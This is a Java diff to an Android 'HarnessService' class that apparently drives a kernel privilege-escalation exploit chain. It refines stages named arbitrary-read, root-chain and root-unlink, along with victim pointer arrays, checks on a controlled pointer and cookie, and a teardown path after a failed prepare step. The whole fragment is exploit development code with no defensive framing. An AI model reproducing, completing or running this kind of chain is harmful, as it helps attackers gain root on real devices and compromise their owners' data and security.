@@ -3238,8 +3238,21 @@ public final class HarnessService extends Service {
     private String runArbitraryRoot(String handleState, String decrement,
                                     String refs, String analysis)
             throws Exception {
-        checkpoint("arbitrary-read-start");
         boolean mutate = "root-chain".equals(requestedStage);
+        String rootUnlink = runArbitraryRootNode(
+                handleState, decrement, refs, analysis, mutate);
+        return mutate
+                ? "status=" +
+                        (rootUnlink.startsWith("status=pass ")
+                                ? "pass" : "miss") +
+                        " stage=root-chain node=[" + rootUnlink + "]"
+                : rootUnlink;
+    }
+
+    private String runArbitraryRootNode(
+            String handleState, String decrement, String refs,
+            String analysis, boolean mutate) throws Exception {
+        checkpoint("arbitrary-read-start");
         String clients = "status=pass stage=raw-extra-skip";
         FutureTask<String> deferredClientPreparation = null;
         long[] victimPointers = new long[RAW_VICTIM_COUNT];
@@ -3295,6 +3308,9 @@ public final class HarnessService extends Service {
         checkpoint(prepare.startsWith("status=pass")
                 ? "arbitrary-read-prepared" : "arbitrary-read-prepare-failed");
         if (!prepare.startsWith("status=pass")) {
+            if (prepareProcessTeardownForPrepareMiss(prepare)) {
+                requiredCheckpoint("arbitrary-read-proc-teardown-required");
+            }
             return "status=miss stage=root-unlink prepare=[" + prepare + "]";
         }
         String first = completeIndexedUnlink(0, 0L);
@@ -4000,10 +4016,7 @@ public final class HarnessService extends Service {
                 "] security=[" +
                 securityTarget + "] internal_write_misses=" +
                 internalWriteMisses + writes;
-        return mutate
-                ? "status=" + (pass ? "pass" : "miss") +
-                        " stage=root-chain node=[" + rootUnlink + "]"
-                : rootUnlink;
+        return rootUnlink;
     }
 
     private boolean signalBootCopy() {
@@ -4116,15 +4129,6 @@ public final class HarnessService extends Service {
 
     private boolean prepareProcessTeardown(String observation)
             throws Exception {
-        if (!directSecurityRepair) {
-            return rejectProcessTeardown("repair-disabled");
-        }
-        if (!processTeardownSupported) {
-            return rejectProcessTeardown("unsupported-action");
-        }
-        if (processTeardownRequired) {
-            return rejectProcessTeardown("already-required");
-        }
         if (!observation.startsWith(
                 "status=miss stage=fake-node-check victim=0 ")) {
             return rejectProcessTeardown("observation-prefix");
@@ -4132,13 +4136,17 @@ public final class HarnessService extends Service {
         if (parseHexLongField(observation, "buffer=0x") == 0) {
             return rejectProcessTeardown("buffer");
         }
-        if (parseHexLongField(observation, "ptr=0x") !=
-                rawControlledPointer) {
+        long pointer = parseHexLongField(observation, "ptr=0x");
+        long cookie = parseHexLongField(observation, "cookie=0x");
+        boolean originalPair = pointer == rawControlledPointer &&
+                cookie == rawControlledCookie && observation.contains(
+                        " ptr=0x" + Long.toHexString(rawControlledPointer) +
+                                " cookie=0x" +
+                                Long.toHexString(rawControlledCookie) + " ");
+        boolean zeroPair = pointer == 0 && cookie == 0 &&
+                observation.contains(" ptr=0x0 cookie=0x0 ");
+        if (!originalPair && !zeroPair) {
             return rejectProcessTeardown("pointer");
-        }
-        if (parseHexLongField(observation, "cookie=0x") !=
-                rawControlledCookie) {
-            return rejectProcessTeardown("cookie");
         }
         if (!observation.contains(" worker_index=-1 ")) {
             return rejectProcessTeardown("worker");
@@ -4158,6 +4166,27 @@ public final class HarnessService extends Service {
                         OwnerService.TRANSACTION_CONTROLLED_HOLD) +
                 " flags=0x0 data_size=0 offsets_size=0 ")) {
             return rejectProcessTeardown("transaction-shape");
+        }
+        return requestProcessTeardown();
+    }
+
+    private boolean prepareProcessTeardownForPrepareMiss(String prepare)
+            throws Exception {
+        if (!ActivationProofs.isRecoverableInitialPrepareMiss(prepare)) {
+            return rejectProcessTeardown("prepare-proof");
+        }
+        return requestProcessTeardown();
+    }
+
+    private boolean requestProcessTeardown() throws Exception {
+        if (!directSecurityRepair) {
+            return rejectProcessTeardown("repair-disabled");
+        }
+        if (!processTeardownSupported) {
+            return rejectProcessTeardown("unsupported-action");
+        }
+        if (processTeardownRequired) {
+            return rejectProcessTeardown("already-required");
         }
         File freeGate = new File(
                 getFilesDir(), "controlled-free.enable.0");
